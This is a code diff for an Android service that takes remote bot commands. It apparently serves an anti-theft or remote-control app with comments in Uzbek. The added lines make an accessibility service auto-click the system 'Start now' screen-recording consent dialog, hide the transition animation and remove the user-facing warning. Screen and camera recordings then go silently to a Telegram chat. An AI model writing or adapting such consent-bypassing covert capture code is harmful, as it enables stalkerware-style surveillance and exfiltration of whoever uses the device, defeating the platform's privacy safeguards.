@@ -165,16 +165,17 @@ class BotCommandListener : Service() {
             val durationSec = parts.firstOrNull { it.toIntOrNull() != null }
                 ?.toInt()?.coerceIn(5, ScreenRecordService.MAX_DURATION_S) ?: 20
             val camFlag     = parts.any { it.lowercase() == "cam" }
+            // Accessibility Service avtomatik "Hozir boshlash" bosadi — o'g'iri ko'rmaydi
+            VolumeKeyAccessibilityService.autoClickScreenRecord = true
+
             val permIntent  = Intent(this, ScreenRecordPermissionActivity::class.java).apply {
                 putExtra(ScreenRecordService.EXTRA_DURATION_SEC, durationSec)
                 putExtra(ScreenRecordService.EXTRA_SEND_TELEGRAM, true)
                 putExtra(ScreenRecordService.EXTRA_WITH_CAMERA, camFlag)
-                addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
+                addFlags(Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_NO_ANIMATION)
             }
             startActivity(permIntent)
-            TelegramSender.sendMessage(token, chatId,
-                "🖥️ Ekran yozuvi so'ralmoqda ($durationSec soniya)...\n" +
-                "⚠️ Qurilmada tizim dialogi chiqadi — birinchi marta \"Hozir boshlash\"ni bosish kerak bo'ladi (Android talabi).")
+            TelegramSender.sendMessage(token, chatId, "🖥️ Ekran yozuvi boshlandi ($durationSec s)...")
             return
         }
 
